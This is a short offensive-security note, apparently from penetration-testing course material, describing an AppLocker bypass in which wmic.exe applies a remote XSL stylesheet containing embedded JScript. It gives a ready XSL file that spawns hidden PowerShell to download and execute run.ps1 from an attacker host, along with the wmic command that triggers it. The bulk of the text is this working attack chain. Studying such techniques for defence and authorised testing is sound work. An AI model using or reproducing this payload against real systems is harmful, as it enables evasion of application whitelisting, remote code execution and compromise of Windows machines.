# 07.05 XSL Transform AppLocker Bypass wmic format

> Section 8.5.2 · wmic executes embedded JScript via XSL

## Overview

The XSLT specification allows embedded JScript inside XSL documents. wmic.exe (a signed Microsoft binary) can be told to apply an XSL transform via `/format:<URL>`, which fetches and processes the XSL file — executing the embedded JScript. Delivers DotNetToJScript payload without needing an HTA.

## Steps

- **Create XSL file** — XML wrapper with `<msxsl:script>` containing JScript payload.
- **Host on attacker** — Apache or Python HTTP server.
- **Trigger via wmic** — `wmic os get /format:http://<LHOST>/p.xsl`.

## Commands

### XSL file with embedded JScript

```xml
<?xml version='1.0'?>
<stylesheet version="1.0"
  xmlns="http://www.w3.org/1999/XSL/Transform"
  xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder">
<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var r = new ActiveXObject('WScript.Shell');
      r.Run('cmd /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/run.ps1\')');
    ]]>
  </ms:script>
  <template match="/">
    <value-of select="user:main()"/>
  </template>
</stylesheet>
```

### Trigger via wmic

```cmd
wmic os get /format:"http://<LHOST>/p.xsl"
```
